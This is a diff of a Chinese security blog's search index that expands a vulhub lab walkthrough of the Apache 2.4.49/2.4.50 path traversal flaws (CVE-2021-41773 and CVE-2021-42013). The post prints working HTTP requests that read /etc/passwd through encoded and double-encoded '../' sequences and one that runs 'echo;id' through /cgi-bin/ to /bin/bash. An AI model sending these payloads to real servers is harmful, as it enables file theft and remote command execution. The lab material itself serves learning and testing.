@@ -8,7 +8,7 @@
       <link href="/2022/05/10/Apache-HTTP-Path-traversal/"/>
       <url>/2022/05/10/Apache-HTTP-Path-traversal/</url>
       
-        <content type="html"><![CDATA[<h1 id="Apache-HTTP-Server路径穿越"><a href="#Apache-HTTP-Server路径穿越" class="headerlink" title="Apache HTTP Server路径穿越"></a>Apache HTTP Server路径穿越</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p><ul><li>版本等于2.4.49</li><li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li></ul><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-41337docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先访问一个真实存在的目录，比如<code>/icons/</code></p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161248403.png" alt="image-20220510161248403"></p><p>然后抓包，查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">GET /icons/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd HTTP/1.1</code></pre><p>如果这样的话他会报错</p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161347687.png" alt="image-20220510161347687"></p><p>因此需要url编码</p><pre class=" language-bash"><code class="language-bash">GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161904932.png" alt="image-20220510161904932"></p><p>出来了！</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><blockquote><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p></blockquote><p>修改参数</p><pre class=" language-bash"><code class="language-bash">GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Length: 7<span class="token keyword">echo</span><span class="token punctuation">;</span><span class="token function">id</span></code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510165306353.png" alt="image-20220510165306353"></p><p>成功！</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="CVE-2021-41773"><a href="#CVE-2021-41773" class="headerlink" title="CVE-2021-41773"></a>CVE-2021-41773</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p><ul><li>版本等于2.4.49</li><li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li></ul><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-41337docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先访问一个真实存在的目录，比如<code>/icons/</code></p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161248403.png" alt="image-20220510161248403"></p><p>然后抓包，查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">GET /icons/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd HTTP/1.1</code></pre><p>如果这样的话他会报错</p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161347687.png" alt="image-20220510161347687"></p><p>因此需要url编码</p><pre class=" language-bash"><code class="language-bash">GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161904932.png" alt="image-20220510161904932"></p><p>出来了！</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><blockquote><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p></blockquote><p>修改参数</p><pre class=" language-bash"><code class="language-bash">GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Length: 7<span class="token keyword">echo</span><span class="token punctuation">;</span><span class="token function">id</span></code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510165306353.png" alt="image-20220510165306353"></p><p>成功！</p><h1 id="CVE-2021-42013"><a href="#CVE-2021-42013" class="headerlink" title="CVE-2021-42013"></a>CVE-2021-42013</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773">CVE-2021-41773</a>进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。</p></blockquote><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-42013docker-compose up -d</code></pre><h2 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>只需要把<code>.</code>进行两次url编码就好</p><p><code>.</code>一次编码是<code>%2e</code>，第二次编码是<code>%%32%65</code></p><p>查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1</code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510204708335.png" alt="image-20220510204708335"></p><p>ok这个也结束！</p>]]></content>
       
       
       <categories>
@@ -78,7 +78,7 @@
     
     
     <entry>
-      <title>Apache换行解析漏洞(CVE-2017-15715)</title>
+      <title>Apache换行解析漏洞</title>
       <link href="/2022/05/10/Apache-Line-Feed/"/>
       <url>/2022/05/10/Apache-Line-Feed/</url>
       
@@ -2270,9 +2270,9 @@
             
             <tag> PHP </tag>
             
-            <tag> mysql </tag>
-            
             <tag> 编程 </tag>
+            
+            <tag> mysql </tag>
             
         </tags>
       
@@ -2510,9 +2510,9 @@
       
         <tags>
             
-            <tag> 编程 </tag>
-            
             <tag> php </tag>
+            
+            <tag> 编程 </tag>
             
             <tag> 网页 </tag>
             
